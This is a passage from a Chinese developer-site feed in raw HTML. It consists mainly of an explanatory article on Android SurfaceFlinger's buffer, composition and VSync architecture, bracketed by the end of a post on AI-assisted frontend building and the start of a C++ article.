<p>AI不是让开发者变懒,而是让开发者把精力花在更重要的事情上。</p>
<h2 data-id="heading-5">给其他后端开发的建议</h2>
<p>如果你也是个后端开发,想做点前端相关的东西,我有几个建议——</p>
<ol>
<li>
<p>从简单项目开始。别一上来就做复杂的SaaS,先做些工具类、展示类的小项目。</p>
</li>
<li>
<p>用好可视化工具。Lovable这类工具能让你快速看到结果,建立信心。</p>
</li>
<li>
<p>AI是助手,不是替代。你依然需要理解基础概念,只是不用抠细节了。</p>
</li>
<li>
<p>多尝试不同的工具。没有最好,只有最适合你项目的工具组合。</p>
</li>
</ol>
<h2 data-id="heading-6">最后说一句</h2>
<p>做这个导航页之前,我以为自己这辈子都不会碰前端了。</p>
<p>但现在发现,有了AI,后端开发也能做全栈项目。这不是说我会转行做前端,而是说,我的可能性变大了。</p>
<p>以后再想做个小工具,不用再"等我先学学前端"了。直接开干,反正有AI帮忙。</p>
<p>这可能就是AI时代最让我兴奋的地方——技术门槛降低了,但创造的门槛反而更高了,因为限制你的不是技术能力,而是你的想法。</p>
<p>所以,别再"等我学会了什么"才开始动手。现在就可以开始了。</p>
<p><strong>相关链接</strong>:</p>
<ul>
<li>我的导航页: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdh.huhage.fun%2F" target="_blank" title="https://dh.huhage.fun/" ref="nofollow noopener noreferrer">dh.huhage.fun/</a></li>
<li>Lovable: <a href="https://link.juejin.cn?target=https%3A%2F%2Flovable.dev%2F" target="_blank" title="https://lovable.dev/" ref="nofollow noopener noreferrer">lovable.dev/</a></li>
<li>Claude Code: <a href="https://link.juejin.cn?target=https%3A%2F%2Fclaude.ai%2Fcode" target="_blank" title="https://claude.ai/code" ref="nofollow noopener noreferrer">claude.ai/code</a></li>
<li>Supabase: <a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2F" target="_blank" title="https://supabase.com/" ref="nofollow noopener noreferrer">supabase.com/</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android SurfaceFlinger 笔记]]></title>    <link>https://juejin.cn/post/7605782093482770458</link>    <guid>https://juejin.cn/post/7605782093482770458</guid>    <pubDate>2026-02-13T02:19:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605782093482770458" data-draft-id="7605856048360980518" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android SurfaceFlinger 笔记"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-13T02:19:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="心源xinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android SurfaceFlinger 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    心源xinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:19:23.000Z" title="Fri Feb 13 2026 02:19:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>SurfaceFlinger（以下简称SF）与ActivityManagerService（AMS）是Android底层双雄。<strong>AMS管的是“谁活着、谁死去、谁在前台”</strong>，是<strong>生命周期的CEO</strong>；<strong>SF管的是“谁画了什么、怎么拼成一张图、何时送到屏幕”</strong>，是<strong>视觉呈现的总导演</strong>。</p>
<p>如果说AMS是Android多任务的大脑，SF就是Android图形系统的<strong>心脏</strong>。它不生产像素（应用才是生产者），但它决定每一帧像素如何<strong>最终出现在你眼前</strong>。以下从六个维度彻底拆解SF。</p>
<hr/>
<h2 data-id="heading-0">一、核心定位：SF到底是什么？</h2>
<p>SurfaceFlinger是一个<strong>系统级服务</strong>，运行在<code>system_server</code>进程，职责极度聚焦：<strong>接收所有应用和系统的图形缓冲区（Buffer），按Z轴顺序、透明度、裁剪区域等属性合成，通过硬件显示到屏幕</strong> 。</p>
<p><strong>关键认知</strong>：SF本身<strong>不做绘制</strong>（Draw）。应用的<code>onDraw()</code>、OpenGL渲染、视频解码输出——这些都发生在应用进程。SF只做<strong>合成</strong>（Compose）。</p>
<p><strong>一句话定性</strong>：SF是Android的<strong>图形混合器</strong>和<strong>显示调度中心</strong>。</p>
<h2 data-id="heading-1">二、SF与AMS的“双核关系”</h2>
<p>理解SF必须放在Android整体架构中。AMS和SF是SystemServer中<strong>耦合最深</strong>的两个服务：</p>



































<table><thead><tr><th>维度</th><th>ActivityManagerService (AMS)</th><th>SurfaceFlinger (SF)</th></tr></thead><tbody><tr><td><strong>管理对象</strong></td><td>四大组件、进程、任务栈</td><td>Surface/Layer、图形缓冲区、显示设备</td></tr><tr><td><strong>核心问题</strong></td><td>谁应该在前台？哪个进程活着？</td><td>这块Buffer是谁的？怎么叠？何时送显？</td></tr><tr><td><strong>触发信号</strong></td><td>Intent、按键、系统事件</td><td><strong>VSync中断</strong>（硬件时钟）</td></tr><tr><td><strong>通信对象</strong></td><td>应用主线程（ActivityThread）</td><td>应用渲染线程（RenderThread）或ViewRootImpl</td></tr><tr><td><strong>纽带</strong></td><td><strong>WindowManagerService (WMS)</strong> —— AMS通知WMS窗口焦点变化；WMS通过<code>relayoutWindow()</code>与SF交互，创建/更新Surface</td><td/></tr></tbody></table>
<p><strong>核心结论</strong>：<strong>AMS决定“演什么”，WMS决定“怎么摆”，SF决定“怎么拼、何时放”</strong>。</p>
<hr/>
<h2 data-id="heading-2">三、SF的三大核心支柱</h2>
<p>要彻底理解SF，必须啃下三块硬骨头：<strong>Buffer管理架构</strong>、<strong>合成策略（GPU/HWC）</strong>、<strong>VSync驱动模型</strong>。</p>
<h3 data-id="heading-3">1. 架构基石：BufferQueue与生产-消费模型</h3>
<p>这是Android图形系统<strong>最优雅的设计</strong>，没有之一。它实现了<strong>无拷贝、跨进程、异步</strong>的缓冲区流转 。</p>
<h4 data-id="heading-4">1.1 核心角色</h4>
<ul>
<li><strong>生产者（Producer）</strong>：应用进程（UI线程/RenderThread、Camera、视频解码器）。调用<code>dequeueBuffer()</code>获取空闲Buffer，填充数据，<code>queueBuffer()</code>归还。</li>
<li><strong>消费者（Consumer）</strong>：SurfaceFlinger。调用<code>acquireBuffer()</code>获取已就绪的Buffer，合成后<code>releaseBuffer()</code>释放。</li>
<li><strong>缓冲区队列（BufferQueue）</strong>：在<strong>SF进程</strong>创建，<strong>Buffer本身是共享内存（GraphicBuffer）</strong>，通过Binder传递文件描述符实现零拷贝跨进程传递 。</li>
</ul>
<h4 data-id="heading-5">1.2 Buffer的四种生命状态（铁律）</h4>
<ul>
<li><strong>FREE（空闲）</strong>：队列中无人使用。生产者可<code>dequeue</code>。</li>
<li><strong>DEQUEUED（出列）</strong>：生产者正在填充数据（如执行<code>onDraw()</code>）。</li>
<li><strong>QUEUED（入列）</strong>：生产者完成绘制，等待SF消费。</li>
<li><strong>ACQUIRED（获取）</strong>：SF正在合成这一帧。</li>
</ul>
<p><strong>这是SF调度的最小单元。每一帧都是这四个状态的循环。</strong></p>
<h4 data-id="heading-6">1.3 Surface与Layer的“皮肉关系”</h4>
<ul>
<li><strong>Surface（皮）</strong>：应用侧看到的“画布”，本质是<code>IGraphicBufferProducer</code>的代理。应用通过它<code>lockCanvas()</code>或<code>eglSwapBuffers()</code>触发Buffer流转。</li>
<li><strong>Layer（肉）</strong>：SF侧的“窗口代表”。<strong>每个Surface在SF内部对应一个Layer对象</strong>，记录Z-order、透明度、显示区域等元数据。</li>
<li><strong>创建时机</strong>：WMS调用<code>relayoutWindow()</code> -&gt; SF创建Layer -&gt; 将BufferProducer Binder返回给应用 -&gt; 应用构建Surface。</li>
</ul>
<p><strong>这就是窗口系统跨进程的完整握手</strong> 。</p>
<h3 data-id="heading-7">2. 合成引擎：GPU合成 vs. 硬件合成（HWC）</h3>
<p>SF收到各Layer的Buffer后，必须把它们“拼”成一张完整的屏幕图像。怎么拼？<strong>两种模式，动态切换</strong> 。</p>
<h4 data-id="heading-8">2.1 GPU合成（OpenGL合成）</h4>
<ul>
<li><strong>方式</strong>：将所有Layer的Buffer作为纹理上传GPU，通过OpenGL绘制到一个目标FBO（帧缓冲对象）。</li>
<li><strong>优点</strong>：极其灵活，任意层数、任意形状、任意混合效果。</li>
<li><strong>缺点</strong>：耗电、带宽占用高。</li>
<li><strong>场景</strong>：界面复杂（多窗口）、动画效果、无法被HWC处理的图层。</li>
</ul>
<h4 data-id="heading-9">2.2 硬件合成（HWC，Hardware Composer）</h4>
<ul>
<li><strong>方式</strong>：将Layer信息（Buffer句柄、位置、Z-order）打包发给显示硬件，<strong>由显示控制器（Display Controller）硬件完成叠加</strong>，SF完全不碰像素数据 。</li>
<li><strong>优点</strong>：几乎零功耗、极低延迟。</li>
<li><strong>缺点</strong>：硬件叠图层数有限（通常4-8层），超出部分必须由GPU合成。</li>
<li><strong>场景</strong>：状态栏、导航栏、视频全屏层数少的场景。</li>
</ul>
<h4 data-id="heading-10">2.3 HWC HAL契约</h4>
<p>SF通过HAL层与硬件驱动交互。核心契约：</p>
<ul>
<li><code>prepare()</code>：SF告诉HWC“我有这些Layer，你能硬件合成哪些？”</li>
<li><code>set()</code>：SF把需要硬件合成的Layer Buffer句柄传给HWC；需要GPU合成的部分，SF自己画好再传给HWC作为<strong>帧缓冲区（Framebuffer）</strong>。</li>
<li><strong>Fence机制</strong>：为了精确同步，Buffer的访问权通过同步栅栏（Fence FD）传递，避免CPU/GPU/显示控制器互相踩内存 。</li>
</ul>
<h3 data-id="heading-11">3. 节拍器：VSync驱动模型</h3>
<p><strong>如果没有VSync，SF就是一盘散沙。</strong> Android 4.1（Jelly Bean）引入VSync和Project Butter，这是SF调度模型的革命 。</p>
<h4 data-id="heading-12">3.1 硬件节拍</h4>
<p>屏幕以固定频率刷新（通常是60Hz，即每16.6ms一帧）。硬件在每次刷新前会产生<strong>垂直同步中断（VSync）</strong>。SF的工作就是<strong>卡在这个中断点上进行合成</strong>，杜绝“撕裂”（Tearing） 。</p>
<h4 data-id="heading-13">3.2 两条VSync线</h4>
<p>SF内部维护<strong>两个独立的VSync分发通道</strong>：</p>
<ol>
<li><strong>VSync-app</strong>：分发给应用。Choreographer监听此信号，触发应用开始布局、绘制、<code>dequeueBuffer</code>。</li>
<li><strong>VSync-sf</strong>：分发给SF自己。SF监听此信号，开始合成、<code>acquireBuffer</code>、调用HWC。</li>
</ol>
<p><strong>偏移量（Offset）</strong>：VSync-app通常比VSync-sf<strong>提前几毫秒</strong>。这样应用画完Buffer入队时，SF刚好开始合成，<strong>流水线最大化</strong>。</p>
<h4 data-id="heading-14">3.3 软件VSync预测</h4>
<p>为了减少对硬件中断的依赖，SF维护一个<strong>软件VSync预测模型</strong>。<code>VSyncPredictor</code>根据历史采样计算下一次中断时间，<code>VSyncDispatchTimerQueue</code>负责定时回调。这套机制保证了即使硬件暂时不稳定，UI依然流畅 。</p>
<hr/>
<h2 data-id="heading-15">四、一次完整的渲染合成闭环（六步法）</h2>
<p>把以上组件串起来，看一个典型帧的生命周期：</p>
<p><strong>Step 1：硬件心跳（VSync-app）</strong>
屏幕发出VSync中断 -&gt; HWC HAL捕获 -&gt; SF的<code>EventThread</code>唤醒 -&gt; 通过<code>BitTube</code>跨进程通知应用的<code>Choreographer</code> 。</p>
<p><strong>Step 2：应用生产（主线程+RenderThread）</strong>
应用收到VSync-app，执行<code>doTraversal()</code> -&gt; 测量、布局、绘制 -&gt; <strong>DisplayList转OpenGL命令</strong> -&gt; <code>eglSwapBuffers()</code>触发：</p>
<ul>
<li><code>dequeueBuffer</code>：从BufferQueue取空闲Buffer。</li>
<li>GPU渲染填充。</li>
<li><code>queueBuffer</code>：Buffer入队，状态置为QUEUED，通过Binder回调SF的<code>onFrameAvailable()</code>，标记<code>mQueuedFrames++</code> 。</li>
</ul>
<p><strong>Step 3：SF唤醒（VSync-sf）</strong>
硬件发出VSync-sf（或软件定时触发）-&gt; SF MessageQueue收到消息 -&gt; 执行<code>onMessageInvalidate()</code> -&gt; 正式启动合成流水线 。</p>
<p><strong>Step 4：准备阶段（PreComposition &amp; latchBuffer）</strong></p>
<ul>
<li><code>preComposition()</code>：遍历所有Layer，检查<code>mQueuedFrames &gt; 0</code>，标记需要刷新的Layer。</li>
<li><code>latchBuffer()</code>：对标记的Layer调用<code>acquireBuffer()</code>，拿到应用刚刚画好的GraphicBuffer，<strong>所有权从应用转给SF</strong> 。</li>
</ul>
<p><strong>Step 5：合成决策（handleTransaction &amp; rebuildLayerStacks &amp; setUpHWComposer）</strong></p>
<ul>
<li><code>handleTransaction</code>：处理窗口大小、位置、Z轴变化 。</li>
<li><code>rebuildLayerStacks</code>：按Z轴排序当前屏幕可见Layer，计算每个Layer的脏区域、可见区域。</li>
<li><code>setUpHWComposer</code>：调用HWC <code>prepare()</code>，<strong>决策哪些Layer用硬件叠，哪些用GPU合成</strong> 。</li>
</ul>
<p><strong>Step 6：执行与送显（doComposition &amp; postComposition）</strong></p>
<ul>
<li>GPU合成部分：SF通过OpenGL将选中的Layer绘制到目标FBO。</li>
<li>调用HWC <code>set()</code>：将GPU合成结果（Framebuffer）和硬件合成Layer的Buffer句柄一并交给驱动。</li>
<li><strong>释放Fence</strong>：通知应用侧“Buffer已被消费，可以继续画下一帧”。<code>releaseBuffer()</code> -&gt; Buffer状态回FREE。</li>
<li>屏幕刷新显示新帧。</li>
</ul>
<p><strong>至此，一帧结束。下一帧由下一个VSync触发。</strong> 16.6ms倒计时重新开始。</p>
<hr/>
<h2 data-id="heading-16">五、架构演进：从硬编码到高度抽象</h2>
<p>SF的架构并非一成不变。理解演进史有助于读懂老代码。</p>








































<table><thead><tr><th>时期</th><th>关键变化</th><th>技术驱动</th></tr></thead><tbody><tr><td><strong>Android 1.x-4.0</strong></td><td>单缓冲、CPU合成为主</td><td>硬件弱，功能简单</td></tr><tr><td><strong>Android 4.1</strong></td><td><strong>Project Butter</strong>：引入VSync、三缓冲、Choreographer</td><td>解决卡顿、掉帧</td></tr><tr><td><strong>Android 5.0</strong></td><td><strong>RenderThread</strong>：将主线程的OpenGL操作移到单独线程</td><td>减少主线程负载，提高响应</td></tr><tr><td><strong>Android 7.0</strong></td><td><strong>SurfaceView同步优化</strong>、HWC 2.0支持</td><td>配合VR、多屏显示</td></tr><tr><td><strong>Android 8.x+</strong></td><td><strong>Treble</strong>：HAL层稳定化；<strong>AIDL化</strong>（类似AMS）</td><td>解耦Framework与厂商实现</td></tr><tr><td><strong>Android 12+</strong></td><td>可变刷新率（VRR）、游戏模式插帧</td><td>高刷屏普及，追求能效比</td></tr></tbody></table>
<p><strong>当前趋势</strong>：SF越来越像一个<strong>策略分发器</strong>，将具体合成工作下放给HWC，自己专注于状态跟踪和VSync调度。</p>
<hr/>
<h2 data-id="heading-17">六、开发层面的启示（实战价值）</h2>
<p>理解了SF，你在应用开发中的很多“玄学”问题都会有根本性认知：</p>
<p><strong>1. 为什么说“丢帧”本质是SF没等到Buffer？</strong></p>
<blockquote>
<p>如果应用主线程卡顿（GC、复杂布局），<code>queueBuffer</code>延迟，VSync-sf到来时SF无新帧可用，<strong>屏幕必须重复显示上一帧</strong>，这就是掉帧（Jank）。</p>
</blockquote>
<p><strong>2. 为什么SurfaceView播放视频不卡UI？</strong></p>
<blockquote>
<p>SurfaceView拥有<strong>独立的Surface</strong>，其BufferQueue直接入队SF，<strong>不经过View层级</strong>，绕过主线程复杂绘制逻辑，同时常配HWC硬件叠层，效率极高 。</p>
</blockquote>
<p><strong>3. 为什么动画卡顿优先怀疑CPU/GPU，但有时是SF负载高？</strong></p>
<blockquote>
<p>SF虽然是合成者，但<strong>GPU合成非常耗资源</strong>。如果Z轴层数太多、HWC叠层用满，SF回退GPU合成，可能造成GPU过载、SF主线程超时16.6ms，导致下一帧延迟。</p>
</blockquote>
<p><strong>4. 为什么后台进程可能影响前台流畅度？</strong></p>
<blockquote>
<p>SF的Layer列表包含<strong>所有可见/不可见窗口</strong>。后台应用若持有窗口（如无界面的<code>WindowManager</code>悬浮窗），其BufferQueue即使无新帧，Layer仍在列表中。极端情况下大量Layer导致SF <code>rebuildLayerStacks</code>耗时超标。</p>
</blockquote>
<p><strong>5. 终极调试工具</strong></p>
<blockquote>
<pre><code class="hljs language-bash" lang="bash">adb shell dumpsys SurfaceFlinger
</code></pre>
<p>这是SF的<strong>核磁共振报告</strong>，能查看每一层的Buffer申请记录、掉帧统计、HWC合成策略、GPU合成时间。<strong>分析卡顿的第一现场</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-18">结语</h2>
<p>SurfaceFlinger和ActivityManagerService是Android底层架构的<strong>阴阳两面</strong>。AMS维系着应用世界的“存在与时间”，SF维系着像素世界的“空间与流动”。</p>
<p>把AMS和SF放在一起理解，你会发现Android根本不是一个“单进程UI库”，而是一个<strong>分布式、事件驱动、硬件感知的实时系统</strong>。UI渲染不是函数的线性调用，而是<strong>多个特权进程在硬件节拍指挥下的环环相扣</strong>。</p>
<p><strong>每一帧的流畅，都是AMS、WMS、SF、App、GPU、Display硬件在16.6ms内的完美合奏。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++中的引用传参和指针传参]]></title>    <link>https://juejin.cn/post/7605810996125253666</link>    <guid>https://juejin.cn/post/7605810996125253666</guid>    <pubDate>2026-02-13T03:35:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125253666" data-draft-id="7605542907119108148" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++中的引用传参和指针传参"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2026-02-13T03:35:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sTone87375"/> <meta itemprop="url" content="https://juejin.cn/user/2946346894764584"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++中的引用传参和指针传参
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2946346894764584/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sTone87375
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:35:55.000Z" title="Fri Feb 13 2026 03:35:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 